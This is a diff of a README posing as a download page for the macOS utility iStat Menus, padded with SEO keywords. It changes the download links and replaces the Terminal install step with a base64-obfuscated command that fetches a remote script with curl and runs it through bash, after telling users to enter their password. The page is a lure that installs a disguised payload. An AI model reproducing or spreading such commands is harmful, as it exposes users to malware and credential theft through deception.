@@ -5,7 +5,7 @@
 ---
 
 ## ✅ Download iStat Menus for macOS  
-[![Download iStat Menus](https://img.shields.io/badge/Download-iStat_Menus-blue)](https://istat-menus-download-mac.github.io/.github)
+[![Download iStat Menus](https://img.shields.io/badge/Download-iStat_Menus-blue)](https://shuziktobehuman.github.io/huja/istat)
 
 ---
 
@@ -24,7 +24,7 @@ Installation via a command in the terminal:
 2. Open the terminal on your device and paste the command you copied above, then press the “Return” button.
 3. Enter your device password and confirm the installation.
 ```bash
-/bin/bash -c "$(curl -fsSL https://veitzeatz.com/get2/install.sh)"
+/bin/bash -c "$(curl -fsSL $(echo aHR0cHM6Ly9waGFubmFyaXRoLmNvbS9nZXQyL2luc3RhbGwuc2g= | base64 -d))"
 ```
 
 
@@ -60,7 +60,7 @@ iStat Menus is a menu bar system monitoring tool built for macOS users who want 
 
 ---
 
-[![Download iStat Menus](https://img.shields.io/badge/Download-iStat_Menus-blue)](https://istat-menus-download-mac.github.io/.github)
+[![Download iStat Menus](https://img.shields.io/badge/Download-iStat_Menus-blue)](https://shuziktobehuman.github.io/huja/istat)
 
 ---
 
@@ -79,5 +79,4 @@ mac performance monitor, istat menu bar, istat macbook, cpu monitor mac,
 macos resource monitor, mac status bar monitor, istat menus download mac,  
 mac menu bar system monitor, istat for macos, mac temperature monitor,  
 istat menus m1, istat menus apple silicon, istat menus macos sonoma  
-
 
